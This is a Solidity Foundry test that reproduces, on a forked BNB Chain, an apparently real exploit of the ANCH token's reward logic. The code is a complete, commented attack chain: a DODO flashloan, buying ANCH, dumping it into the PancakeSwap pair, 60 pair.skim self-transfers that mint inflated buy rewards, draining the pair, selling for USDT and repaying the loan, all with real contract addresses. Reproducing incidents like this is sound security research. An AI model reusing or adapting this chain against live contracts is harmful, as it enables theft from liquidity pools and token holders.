// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1557846766682140672
// @Contract address
// https://bscscan.com/address/0xa4f5d4afd6b9226b3004dd276a9f778eb75f2e9e#code

// VULNERABILITY + FULL EXPLOIT CHAIN (annotated below in DPPFlashLoanCall):
// Root: ANCHToken reward logic (see sources/ANCHToken.sol) only checks
// sender/recipient identity against the pair, not economic reality.
// Exploit uses DODO flashloan + repeated pair.skim(pair) self-transfers
// to trigger repeated "buy" reward mints into the pair, then drains.

contract ContractTest is Test {
    IERC20 ANCH = IERC20(0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 20_302_534);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        ANCH.approve(address(Router), type(uint256).max);
        // EXPLOIT STEP 0: Take a flashloan of 50k USDT from DODO DPP pool.
        // The callback DPPFlashLoanCall will run the entire attack atomically
        // and must repay before returning.
        DVM(dodo).flashLoan(0, 50_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // VULNERABILITY (root cause is in ANCHToken, exploited here):
        // ANCHToken's reward logic in _transfer / _tokenBuyTransferReward triggers
        // purely on (sender == uniswapV2Pair) for "buys", minting 0.05% (rewardRate=5/10000)
        // of the transferred amount from the token contract's own balance to the
        // recipient. No check that an actual swap or liquidity move occurred, and
        // no check against pair.skim() self-transfers. pair.skim(to) does:
        //   IERC20(ANCH).transfer(to, pair.balanceOf(ANCH) - reserve0)
        // When to==pair this is a pair→pair ERC20 transfer, satisfying the
        // sender==pair condition and causing a "buy reward" to be minted into the pair.

        // EXPLOIT STEP 1: Use flash-loaned USDT to buy ANCH on Pancake (also
        // incidentally triggers a buy reward to us, but main point is acquiring ANCH).
        buyANCH();

        // EXPLOIT STEP 2: Dump the entire ANCH balance into the pair.
        // This creates "excess" (pair's ANCH balance now >> its internal reserve).
        // No swap happens; this is just inflating the ERC20 balanceOf(pair).
        ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));

        // EXPLOIT STEP 3: Call pair.skim(pair) in a tight loop (60 times).
        // Each skim(pair) executes ANCH.transfer(pair, excess) where sender==pair,
        // so ANCHToken mints rewardAmount ~ excess * 0.0005 into the pair's
        // _rOwned (via reflection math) from the token's contract balance.
        // Because we skim TO the pair, the newly minted reward increases the
        // excess for the NEXT iteration. The surplus ratchets upward
        // exponentially-ish (roughly +~124 ANCH per iteration in practice).
        for (uint256 index = 0; index < 60; index++) {
            Pair.skim(address(Pair));
        }

        // EXPLOIT STEP 4: Final skim(this) drains the now massively inflated
        // surplus ANCH balance out of the pair to the attacker. Again,
        // sender==pair triggers the buy-reward path, but the dominant effect
        // is extracting the accumulated minted rewards.
        Pair.skim(address(this));

        // EXPLOIT STEP 5: Sell the extracted (inflated) ANCH back into the
        // pair for USDT via the router (using fee-on-transfer swap path).
        // The attacker now holds the USDT profit (minus flashloan principal).
        sellANCH();

        // EXPLOIT STEP 6: Repay the 50k USDT flashloan principal to DODO.
        // Any excess USDT remains as profit in this contract.
        USDT.transfer(dodo, 50_000 * 1e18);
    }

    function buyANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(ANCH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(ANCH);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ANCH.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
